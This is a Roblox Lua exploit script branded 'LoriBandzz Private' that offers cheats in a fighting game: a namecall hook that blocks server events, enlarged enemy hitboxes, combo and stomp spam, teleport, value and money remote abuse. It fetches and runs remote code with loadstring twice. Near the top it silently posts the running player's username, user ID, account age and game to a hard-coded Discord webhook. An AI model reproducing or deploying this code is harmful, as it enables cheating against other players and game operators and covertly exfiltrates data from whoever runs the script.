pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local events = ReplicatedStorage:WaitForChild("events")
local MainKeys = events:WaitForChild("MainKeys")
local Solo = events:WaitForChild("SoloPlrEvents")
local Duo = events:FindFirstChild("DuoPlrEvents")
local ValueChange = events:FindFirstChild("ValueChange")
local ValueChange2 = events:FindFirstChild("ValueChange2")
local MoneyGain = events:FindFirstChild("MoneyGain")
local PvpToggle = events:FindFirstChild("PvpToggle")
local nonFight = events:FindFirstChild("NonFightEvents")
local CharRemote = nonFight and nonFight:FindFirstChild("Char")
local SneakEvents = events:FindFirstChild("SneakRequestEvents")
local SendSneak = SneakEvents and SneakEvents:FindFirstChild("SendSneakToServer")
local AnimationSystem = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("AnimationSystem"))

local WEBHOOK="https://discord.com/api/webhooks/1513915545974603899/w4_knfLlf2o-u65_cUPRUGkUNsgE06gITiFFLEs0-223OSb-CnRs56q_K1tGs6Bd0OyR"
local function getEquippedLoadout()
	local keys = {
		Punches = {"PA", "PA2", "PA3"}, Headlocks = {"DTTool"}, Blocks = {"BC"},
		Mop = {"MA", "DragMop"}, Runup = {"RA"}, Rush = {"NDTool"},
		SquareUp = {"SU"}, ToolAnimation = {"toolLeap"}
	}
	local results = {}
	for category, names in pairs(keys) do
		local selections = {}
		for _, name in ipairs(names) do
			local obj = player:FindFirstChild(name)
			if obj and obj:IsA("ValueBase") then table.insert(selections, tostring(obj.Value)) end
		end
		results[category] = #selections > 0 and table.concat(selections, ", ") or "Not detected"
	end
	return results
end

task.spawn(function()
	if not WEBHOOK:match("^https://discord%.com/api/webhooks/") then return end
	local gameName = game.Name
	pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
	local loadout = getEquippedLoadout()
	local fields = {
		{name="Username", value="@" .. player.Name, inline=true},
		{name="Display Name", value=player.DisplayName, inline=true},
		{name="User ID", value=tostring(player.UserId), inline=true},
		{name="Account Age", value=tostring(player.AccountAge) .. " days", inline=true},
		{name="Game", value=gameName, inline=true},
		{name="Place ID", value=tostring(game.PlaceId), inline=true}
	}
	for _, item in ipairs({"Punches", "Headlocks", "Blocks", "Mop", "Runup", "Rush", "SquareUp", "ToolAnimation"}) do
		table.insert(fields, {name=item, value=loadout[item], inline=false})
	end
	table.insert(fields, {name="Date", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false})
	local payload = HttpService:JSONEncode({
		username="LoriBandzz Private",
		embeds={{title="⚡ LORIBANDZZ PRIVATE", description="Session activity report", color=0xB8BEC9,
			fields=fields, footer={text="LoriBandzz Private • Session Report"}}}
	})
	local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
	if req then pcall(function()
			req({Url=WEBHOOK, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload})
		end) end
end)

for _, name in ipairs({"BLOSSOM_PRIVATE", "BLOSSOM_MOBILE", "STUNNA_SNEAK"}) do
	local old = playerGui:FindFirstChild(name)
	if old then old:Destroy() end
end

local C_BG = Color3.fromRGB(12,12,15)
local C_TITLE = Color3.fromRGB(25,25,30)
local C_ON = Color3.fromRGB(225,230,240)
local C_OFF = Color3.fromRGB(105,110,120)
local C_LABEL = Color3.fromRGB(235,237,242)
local C_DIM = Color3.fromRGB(145,150,160)
local C_SEP = Color3.fromRGB(100,105,115)
local TW_ROW = TweenInfo.new(.22, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
local TW_DOT = TweenInfo.new(.3, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
local features = {}
local comboThread, stompThread, escapeThread, pvpThread, pvpOnThread
local escapeActive, brassActive, hitboxOn = false, false, false
local brassConnection, healthConnection
local originalMaxHealth
local healthBoostActive = false
local HEALTH_BONUS = 15
local HITBOX_SIZE = Vector3.new(5,5,5)
local valueText, lastValueFire, lastHitboxApply = "0", 0, 0
local looseFightBlocked, beatDownBlocked, duoBlocked = false, false, false

local function makeFeature(name, key, opts)
	local f = {name=name, key=key, state=false, onActivate=opts.onActivate or function() end,
	onDeactivate=opts.onDeactivate or function() end, onRender=opts.onRender}
	table.insert(features, f)
	return f
end

local hookActive = false
pcall(function()
	if not hookmetamethod or not getnamecallmethod then return end
	local old
	old = hookmetamethod(game, "__namecall", function(self, ...)
		if getnamecallmethod() == "FireServer" then
			local first = select(1, ...)
			if self == Solo and ((looseFightBlocked and first == "LooseFight") or
				(beatDownBlocked and first == "BeatDown")) then return nil end
			if self == Duo and duoBlocked then return nil end
		end
		return old(self, ...)
	end)
	hookActive = true
end)

local function getTorso(char)
	return char and (char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart"))
end
local function findPlayer(name)
	if name == "" then return nil end
	name = name:lower()
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= player and (p.Name:lower():find(name,1,true) or p.DisplayName:lower():find(name,1,true)) then return p end
	end
end
local function nearestEnemy(range)
	local char = player.Character
	local root = char and (char:FindFirstChild("HumanoidRootPart") or getTorso(char))
	if not root then return nil end
	local best, bestDistance = nil, range or 32
	for _, other in ipairs(Players:GetPlayers()) do
		if other ~= player then
			local target = other.Character
			local tr = target and (target:FindFirstChild("HumanoidRootPart") or getTorso(target))
			local hum = target and target:FindFirstChildOfClass("Humanoid")
			if tr and hum and hum.Health > 0 then
				local distance = (root.Position - tr.Position).Magnitude
				if distance < bestDistance then best, bestDistance = other, distance end
			end
		end
	end
	return best
end
local function canFight()
	local char = player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local data = char and char:FindFirstChild("Player")
	local pvp = data and data:FindFirstChild("PvpOn")
	local damages = data and data:FindFirstChild("Damages")
	local ragdoll = damages and damages:FindFirstChild("Ragdoll")
	return hum and hum.Health > 0 and pvp and pvp.Value and not (ragdoll and ragdoll.Value)
end

local punches = {"PunchNL", "PunchNL2", "PunchNL3"}
local leaps = {"ToolLeap", "ToolLeap2", "ToolLeap3"}
local punchIndex, lastPunch, lastLeap, lastStomp, previousLeap = 1, 0, 0, 0, nil
local function playAnimation(name)
	local char = player.Character
	if not char then return false end
	return pcall(function() AnimationSystem.PlayAnimation(char, name) end)
end
local function playPunch()
	if os.clock() - lastPunch < .3 then return end
	local char = player.Character
	local data = char and char:FindFirstChild("Player")
	local allowed = data and data:FindFirstChild("AllowAnimations")
	if allowed and not allowed.Value then return end
	if playAnimation(punches[punchIndex]) then
		punchIndex = punchIndex % #punches + 1
		lastPunch = os.clock()
	end
end
local function playLeap()
	if os.clock() - lastLeap < 1 or not canFight() then return end
	local char = player.Character
	local data = char and char:FindFirstChild("Player")
	local damages = data and data:FindFirstChild("Damages")
	local values = damages and damages:FindFirstChild("values")
	local active = values and values:FindFirstChild("DamageTool")
	if active and active.Value then return end
	local choices = {}
	for _, name in ipairs(leaps) do
		if name ~= previousLeap then table.insert(choices, name) end
	end
	local name = choices[math.random(1, #choices)]
	if playAnimation(name) then previousLeap, lastLeap = name, os.clock() end
end
local function playStomp()
	if not canFight() or os.clock() - lastStomp < 1 then return false end
	if playAnimation("Stomp") then
		lastStomp = os.clock()
		return true
	end
	return false
end

local function comboActivate()
	if comboThread then return end
	comboThread = task.spawn(function()
		while true do
			if nearestEnemy(32) and canFight() then
				local char = player.Character
				local data = char and char:FindFirstChild("Player")
				local damages = data and data:FindFirstChild("Damages")
				local values = damages and damages:FindFirstChild("values")
				local tool = values and values:FindFirstChild("DamageTool")
				local escaped = tool and tool:FindFirstChild("Escaped")
				if escaped and ValueChange then
					pcall(function() ValueChange:FireServer(escaped, true) end)
				end
				pcall(function() MainKeys:FireServer("Push") end)
				playPunch()
				pcall(function() MainKeys:FireServer("Punch") end)
				pcall(function() MainKeys:FireServer("Drag") end)
				playLeap()
				pcall(function() MainKeys:FireServer("DamageTool") end)
			end
			task.wait(.05)
		end
	end)
end
local function comboDeactivate()
	if comboThread then task.cancel(comboThread); comboThread = nil end
end
local function stompActivate()
	if stompThread then return end
	stompThread = task.spawn(function()
		while true do
			if nearestEnemy(16) and playStomp() then
				pcall(function() MainKeys:FireServer("Stomp") end)
			end
			task.wait(.1)
		end
	end)
end
local function stompDeactivate()
	if stompThread then task.cancel(stompThread); stompThread = nil end
end
local function escapeActivate()
	if escapeActive then return end
	escapeActive = true
	escapeThread = task.spawn(function()
		while escapeActive do
			local char = player.Character
			local data = char and char:FindFirstChild("Player")
			local damages = data and data:FindFirstChild("Damages")
			local values = damages and damages:FindFirstChild("values")
			local tool = values and values:FindFirstChild("DamageTool")
			local able = tool and tool:FindFirstChild("AbleToEscape")
			local escaped = tool and tool:FindFirstChild("Escaped")
			if able and escaped and able:IsA("BoolValue") and escaped:IsA("BoolValue") and able.Value and not escaped.Value and ValueChange then
				pcall(function() ValueChange:FireServer(escaped, true) end)
			end
			task.wait(.1)
		end
	end)
end
local function escapeDeactivate()
	escapeActive = false
	if escapeThread then task.cancel(escapeThread); escapeThread = nil end
end
local function pvpActivate()
	if pvpThread then return end
	pvpThread = task.spawn(function()
		while true do
			if PvpToggle then pcall(function() PvpToggle:FireServer(false) end) end
			task.wait(1)
		end
	end)
end
local function pvpDeactivate()
	if pvpThread then task.cancel(pvpThread); pvpThread = nil end
end
local function pvpOnActivate()
	if pvpOnThread then return end
	pvpOnThread = task.spawn(function()
		while true do
			if PvpToggle then pcall(function() PvpToggle:FireServer(true) end) end
			task.wait(1)
		end
	end)
end
local function pvpOnDeactivate()
	if pvpOnThread then task.cancel(pvpOnThread); pvpOnThread = nil end
end
local function applyHitbox(char, enlarged)
	local t = getTorso(char)
	if not t then return end
	t.Size = enlarged and HITBOX_SIZE or Vector3.new(2,2,1)
	t.Transparency = enlarged and 1 or 0
end
local function setHitboxes(enlarged)
	for _, other in ipairs(Players:GetPlayers()) do
		if other ~= player then applyHitbox(other.Character, enlarged) end
	end
end
local function hitboxRender()
	if not hitboxOn or os.clock() - lastHitboxApply < .5 then return end
	lastHitboxApply = os.clock()
	setHitboxes(true)
end
local function valueRender()
	if not ValueChange2 or os.clock() - lastValueFire < .1 then return end
	lastValueFire = os.clock()
	local char = player.Character
	local wallet = char and char:FindFirstChild("Wallet")
	local handle = wallet and wallet:FindFirstChild("Handle")
	local billboard = handle and handle:FindFirstChild("BillboardGui")
	local label = billboard and billboard:FindFirstChild("TextLabel")
	if label then pcall(function() ValueChange2:FireServer(label, valueText) end) end
end
local function equipBrass()
	local char = player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local backpack = player:FindFirstChildOfClass("Backpack")
	if not hum or not backpack then return end
	for _, tool in ipairs(backpack:GetChildren()) do
		if tool:IsA("Tool") and tool.Name:lower():find("brass") then hum:EquipTool(tool); return end
	end
end
local function brassActivate()
	if brassActive then return end
	brassActive = true
	equipBrass()
	brassConnection = player.CharacterAdded:Connect(function()
		task.wait(1)
		if brassActive then equipBrass() end
	end)
end
local function brassDeactivate()
	brassActive = false
	if brassConnection then brassConnection:Disconnect(); brassConnection = nil end
end
local function applyHealthBoost()
	local char = player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	if not originalMaxHealth then originalMaxHealth = hum.MaxHealth end
	hum.MaxHealth = originalMaxHealth + HEALTH_BONUS
	hum.Health = math.min(hum.Health + HEALTH_BONUS, hum.MaxHealth)
end
local function healthBoostActivate()
	if healthBoostActive then return end
	healthBoostActive = true
	applyHealthBoost()
	healthConnection = player.CharacterAdded:Connect(function(char)
		originalMaxHealth = nil
		local hum = char:WaitForChild("Humanoid", 10)
		if hum and healthBoostActive then applyHealthBoost() end
	end)
end
local function healthBoostDeactivate()
	healthBoostActive = false
	if healthConnection then healthConnection:Disconnect(); healthConnection = nil end
	local char = player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hum and originalMaxHealth then
		hum.MaxHealth = originalMaxHealth
		hum.Health = math.min(hum.Health, hum.MaxHealth)
	end
	originalMaxHealth = nil
end

makeFeature("Health Boost", Enum.KeyCode.Unknown, {onActivate=healthBoostActivate, onDeactivate=healthBoostDeactivate})
makeFeature("Auto Escape", Enum.KeyCode.Unknown, {onActivate=escapeActivate, onDeactivate=escapeDeactivate})
makeFeature("Combo Spam", Enum.KeyCode.P, {onActivate=comboActivate, onDeactivate=comboDeactivate})
makeFeature("Auto Stomp", Enum.KeyCode.Unknown, {onActivate=stompActivate, onDeactivate=stompDeactivate})
local fHitbx = makeFeature("Hitbox+", Enum.KeyCode.Unknown, {
	onActivate=function() hitboxOn=true; setHitboxes(true) end,
	onDeactivate=function() hitboxOn=false; setHitboxes(false) end,
	onRender=hitboxRender
})
makeFeature("Value Edit", Enum.KeyCode.Unknown, {onRender=valueRender})
makeFeature("Brass Knuckles", Enum.KeyCode.Unknown, {onActivate=brassActivate, onDeactivate=brassDeactivate})
makeFeature("Block LooseFight", Enum.KeyCode.Unknown, {
	onActivate=function() looseFightBlocked=true end,
	onDeactivate=function() looseFightBlocked=false end
})
makeFeature("Block BeatDown", Enum.KeyCode.Unknown, {
	onActivate=function() beatDownBlocked=true end,
	onDeactivate=function() beatDownBlocked=false end
})
makeFeature("Block Duo Events", Enum.KeyCode.Unknown, {
	onActivate=function() duoBlocked=true end,
	onDeactivate=function() duoBlocked=false end
})
makeFeature("PVP Off", Enum.KeyCode.Unknown, {onActivate=pvpActivate, onDeactivate=pvpDeactivate})
makeFeature("PVP On", Enum.KeyCode.Unknown, {onActivate=pvpOnActivate, onDeactivate=pvpOnDeactivate})

local function corner(parent, radius)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, radius or 10)
	c.Parent = parent
	return c
end
local function new(class, props, parent)
	local obj = Instance.new(class)
	for key, value in pairs(props) do obj[key] = value end
	obj.Parent = parent
	return obj
end
local function scrollLayout(frame)
	local layout = new("UIListLayout", {SortOrder=Enum.SortOrder.LayoutOrder, Padding=UDim.new(0,6)}, frame)
	new("UIPadding", {PaddingTop=UDim.new(0,4), PaddingBottom=UDim.new(0,4),
		PaddingLeft=UDim.new(0,4), PaddingRight=UDim.new(0,4)}, frame)
	layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		frame.CanvasSize = UDim2.fromOffset(0, layout.AbsoluteContentSize.Y + 12)
	end)
	return layout
end

local sneakGui = new("ScreenGui", {Name="STUNNA_SNEAK", ResetOnSpawn=false, IgnoreGuiInset=true,
	ZIndexBehavior=Enum.ZIndexBehavior.Sibling, Enabled=false}, playerGui)
local sneakPanel = new("Frame", {Size=UDim2.new(0,245,.7,0), Position=UDim2.new(0,8,.15,0),
	BackgroundColor3=C_BG, BorderSizePixel=0, Active=true}, sneakGui)
corner(sneakPanel,14)
new("UIStroke", {Color=Color3.fromRGB(145,150,165), Thickness=1}, sneakPanel)
local sneakHeader = new("Frame", {Size=UDim2.new(1,0,0,44), BackgroundColor3=C_TITLE, BorderSizePixel=0}, sneakPanel)
corner(sneakHeader,14)
new("TextLabel", {Size=UDim2.new(1,-50,1,0), Position=UDim2.fromOffset(12,0),
	BackgroundTransparency=1, Text="Sneak Tool ⚡", TextColor3=C_LABEL, TextSize=13,
	Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left}, sneakHeader)
local closeSneak = new("TextButton", {Size=UDim2.fromOffset(24,24), Position=UDim2.new(1,-30,.5,-12),
	BackgroundColor3=Color3.fromRGB(220,40,90), BorderSizePixel=0, Text="✕", TextSize=12,
	TextColor3=Color3.new(1,1,1), Font=Enum.Font.GothamBold}, sneakHeader)
corner(closeSneak,12)
closeSneak.MouseButton1Click:Connect(function() sneakGui.Enabled=false end)
local status = new("TextLabel", {Size=UDim2.new(1,-12,0,20), Position=UDim2.new(0,6,1,-24),
	BackgroundTransparency=1, Text="Select a player", TextColor3=C_DIM, TextSize=11,
	Font=Enum.Font.Gotham, TextXAlignment=Enum.TextXAlignment.Left}, sneakPanel)
local sneakScroll = new("ScrollingFrame", {Size=UDim2.new(1,-8,1,-72), Position=UDim2.fromOffset(4,48),
	BackgroundTransparency=1, BorderSizePixel=0, ScrollBarThickness=4,
	ScrollBarImageColor3=C_ON, CanvasSize=UDim2.fromOffset(0,0),
	ScrollingEnabled=true, ScrollingDirection=Enum.ScrollingDirection.Y,
	ElasticBehavior=Enum.ElasticBehavior.WhenScrollable, Active=true}, sneakPanel)
scrollLayout(sneakScroll)
local sneakRows = {}
local sneakOrder = 0
local function addSneakRow(other)
	if other == player or sneakRows[other] then return end
	sneakOrder += 1
	local row = new("TextButton", {Name=other.Name, LayoutOrder=sneakOrder,
		Size=UDim2.new(1,-8,0,42), BackgroundColor3=Color3.fromRGB(32,33,39), BorderSizePixel=0,
		Text=other.DisplayName .. " (" .. other.Name .. ")", TextColor3=C_LABEL, TextSize=12,
		Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left}, sneakScroll)
	corner(row,10)
	new("UIPadding", {PaddingLeft=UDim.new(0,10)}, row)
	row.MouseButton1Click:Connect(function()
		if not other.Parent or not other.Character then
			status.Text="Player unavailable"; status.TextColor3=C_OFF; return
		end
		local hum = other.Character:FindFirstChildOfClass("Humanoid")
		if not hum or hum.Health <= 0 then
			status.Text="Target not active"; status.TextColor3=C_OFF; return
		end
		local remote = events:FindFirstChild("SneakRequestEvents")
		remote = remote and remote:FindFirstChild("SendSneakToServer")
		if not remote or not remote:IsA("RemoteEvent") then
			status.Text="Sneak remote unavailable"; status.TextColor3=C_OFF; return
		end
		local ok, err = pcall(function() remote:FireServer(other) end)
		status.Text = ok and ("Request sent: " .. other.DisplayName) or ("Request failed: " .. tostring(err):sub(1,28))
		status.TextColor3 = ok and C_ON or C_OFF
	end)
	sneakRows[other] = row
end
for _, other in ipairs(Players:GetPlayers()) do addSneakRow(other) end
Players.PlayerAdded:Connect(addSneakRow)
Players.PlayerRemoving:Connect(function(other)
	if sneakRows[other] then sneakRows[other]:Destroy(); sneakRows[other]=nil end
end)

local mobileGui = new("ScreenGui", {Name="BLOSSOM_MOBILE", ResetOnSpawn=false,
	IgnoreGuiInset=true, ZIndexBehavior=Enum.ZIndexBehavior.Sibling}, playerGui)
local toggle = new("TextButton", {Name="LoriBandzzToggle", Size=UDim2.fromOffset(34,34),
	Position=UDim2.new(1,-44,.5,-17), BackgroundColor3=Color3.fromRGB(20,20,24),
	BorderSizePixel=0, Text="⚡", TextSize=18, TextColor3=C_LABEL,
	Font=Enum.Font.GothamBold, ZIndex=10}, mobileGui)
corner(toggle,10)
new("UIStroke", {Color=Color3.fromRGB(175,180,195), Thickness=1.2}, toggle)
local panel = new("Frame", {Size=UDim2.new(0,245,.7,0), Position=UDim2.new(0,8,.15,0),
	BackgroundColor3=C_BG, BorderSizePixel=0, Active=true}, mobileGui)
corner(panel,14)
new("UIStroke", {Color=Color3.fromRGB(145,150,165), Thickness=1}, panel)
local header = new("Frame", {Size=UDim2.new(1,0,0,44), BackgroundColor3=C_TITLE, BorderSizePixel=0}, panel)
corner(header,14)
new("TextLabel", {Size=UDim2.new(1,-20,1,0), Position=UDim2.fromOffset(10,0),
	BackgroundTransparency=1, Text="LoriBandzz Private ⚡", TextColor3=C_LABEL,
	TextSize=13, Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left}, header)
local scroll = new("ScrollingFrame", {Size=UDim2.new(1,-8,1,-52), Position=UDim2.fromOffset(4,48),
	BackgroundTransparency=1, BorderSizePixel=0, ScrollBarThickness=4,
	ScrollBarImageColor3=C_ON, CanvasSize=UDim2.fromOffset(0,0),
	ScrollingEnabled=true, ScrollingDirection=Enum.ScrollingDirection.Y,
	ElasticBehavior=Enum.ElasticBehavior.WhenScrollable, Active=true}, panel)
scrollLayout(scroll)

local function makeDraggable(handle, object, onTap)
	local startPos, startInput, active, moved
	handle.InputBegan:Connect(function(input)
		if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
		active, moved, startInput, startPos = input, false, input.Position, object.Position
	end)
	UIS.InputChanged:Connect(function(input)
		if not active then return end
		if active.UserInputType == Enum.UserInputType.Touch and input ~= active then return end
		if active.UserInputType == Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
		local delta = input.Position - startInput
		if delta.Magnitude > 8 then moved=true end
		if moved then
			object.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X,
				startPos.Y.Scale, startPos.Y.Offset+delta.Y)
		end
	end)
	UIS.InputEnded:Connect(function(input)
		if not active then return end
		if input ~= active then return end
		active = nil
		if not moved and onTap then onTap() end
	end)
end
makeDraggable(toggle, toggle, function() panel.Visible = not panel.Visible end)
makeDraggable(sneakHeader, sneakPanel)

local order = 0
local function nextOrder() order += 1; return order end
local function toggleRow(feat)
	local row = new("Frame", {Size=UDim2.new(1,-8,0,42), LayoutOrder=nextOrder(),
		BackgroundColor3=Color3.fromRGB(32,33,39), BorderSizePixel=0}, scroll)
	corner(row,10)
	local dot = new("Frame", {Size=UDim2.fromOffset(10,10), Position=UDim2.new(0,12,.5,-5),
		BackgroundColor3=C_OFF, BorderSizePixel=0}, row)
	corner(dot,10)
	local label = new("TextLabel", {Size=UDim2.new(.65,0,1,0), Position=UDim2.fromOffset(30,0),
		BackgroundTransparency=1, Text=feat.name, TextColor3=C_DIM, TextSize=12,
		Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left}, row)
	local button = new("TextButton", {Size=UDim2.fromOffset(54,28), Position=UDim2.new(1,-62,.5,-14),
		BackgroundColor3=Color3.fromRGB(110,25,60), BorderSizePixel=0, Text="OFF",
		TextColor3=C_OFF, TextSize=13, Font=Enum.Font.GothamBold}, row)
	corner(button,8)
	button.MouseButton1Click:Connect(function()
		feat.state = not feat.state
		if feat.state then feat.onActivate() else feat.onDeactivate() end
		TweenService:Create(dot,TW_DOT,{BackgroundColor3=feat.state and C_ON or C_OFF}):Play()
		TweenService:Create(button,TW_ROW,{BackgroundColor3=feat.state and Color3.fromRGB(75,80,92) or Color3.fromRGB(110,25,60)}):Play()
		button.Text=feat.state and "ON" or "OFF"
		button.TextColor3=feat.state and C_ON or C_OFF
		label.TextColor3=feat.state and C_LABEL or C_DIM
	end)
end
for _, feat in ipairs(features) do toggleRow(feat) end

new("Frame", {Size=UDim2.new(1,-8,0,1), LayoutOrder=nextOrder(), BackgroundColor3=C_SEP, BorderSizePixel=0}, scroll)
local function inputRow(placeholder, title, callback)
	local row = new("Frame", {Size=UDim2.new(1,-8,0,44), LayoutOrder=nextOrder(),
		BackgroundColor3=Color3.fromRGB(32,33,39), BorderSizePixel=0}, scroll)
	corner(row,10)
	local input = new("TextBox", {Size=UDim2.new(.52,-6,0,38), Position=UDim2.new(0,6,.5,-19),
		BackgroundColor3=Color3.fromRGB(44,12,24), BorderSizePixel=0, Text="",
		TextColor3=C_LABEL, TextSize=13, Font=Enum.Font.Gotham,
		PlaceholderText=placeholder, PlaceholderColor3=C_DIM}, row)
	corner(input,8)
	local button = new("TextButton", {Size=UDim2.new(.44,-6,0,38), Position=UDim2.new(.56,0,.5,-19),
		BackgroundColor3=Color3.fromRGB(180,35,100), BorderSizePixel=0, Text=title,
		TextColor3=Color3.new(1,1,1), TextSize=13, Font=Enum.Font.GothamBold}, row)
	corner(button,8)
	button.MouseButton1Click:Connect(function() callback(input.Text) end)
end
inputRow("Give money", "Give $", function(v)
	if not MoneyGain then return end
	local amount = tonumber(v) or 1
	if amount > 0 then amount = -amount end
	pcall(function() MoneyGain:FireServer(amount) end)
end)
inputRow("Value amount", "Set Value", function(v) valueText=v end)
inputRow("Hitbox size", "Set Hitbox", function(v)
	local size = math.clamp(tonumber(v) or 5, 1, 50)
	HITBOX_SIZE = Vector3.new(size,size,size)
	if fHitbx.state then setHitboxes(true) end
end)
inputRow("Teleport to player", "Teleport", function(v)
	local other = findPlayer(v)
	local myRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
	local targetRoot = other and other.Character and other.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot or not targetRoot then return end
	local offset = myRoot.Position - targetRoot.Position
	if offset.Magnitude < .01 then offset = Vector3.new(0,0,1) end
	local position = targetRoot.Position + offset.Unit * 3
	myRoot.CFrame = CFrame.lookAt(position, targetRoot.Position)
end)
inputRow(":char username", "Fire :Char", function(v)
	if v == "" or not CharRemote then return end
	pcall(function() CharRemote:FireServer(v) end)
end)

local sneakButton = new("TextButton", {Size=UDim2.new(1,-8,0,52), LayoutOrder=nextOrder(),
	BackgroundColor3=Color3.fromRGB(120,30,70), BorderSizePixel=0,
	Text="🕵 Sneak Tool ▸ Open", TextColor3=Color3.fromRGB(255,120,190),
	TextSize=14, Font=Enum.Font.GothamBold}, scroll)
corner(sneakButton,10)
local function updateSneakButton()
	sneakButton.Text = sneakGui.Enabled and "🕵 Sneak Tool ▸ Close" or "🕵 Sneak Tool ▸ Open"
end
sneakButton.MouseButton1Click:Connect(function() sneakGui.Enabled=not sneakGui.Enabled end)
sneakGui:GetPropertyChangedSignal("Enabled"):Connect(updateSneakButton)
updateSneakButton()

local cobalt = new("TextButton", {Size=UDim2.new(1,-8,0,52), LayoutOrder=nextOrder(),
	BackgroundColor3=Color3.fromRGB(135,30,80), BorderSizePixel=0,
	Text="⚡ Load Cobalt", TextColor3=Color3.fromRGB(255,150,210),
	TextSize=14, Font=Enum.Font.GothamBold}, scroll)
corner(cobalt,10)
cobalt.MouseButton1Click:Connect(function()
	cobalt.Text="Loading..."
	task.spawn(function()
		local ok, err = pcall(function()
			loadstring(game:HttpGet("https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau"))()
		end)
		cobalt.Text = ok and "✓ Cobalt Loaded" or "X Failed"
		if not ok then warn("[Cobalt]", err) end
	end)
end)

local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function()
	for _, feat in ipairs(features) do
		if feat.state and feat.onRender then pcall(feat.onRender) end
	end
end)
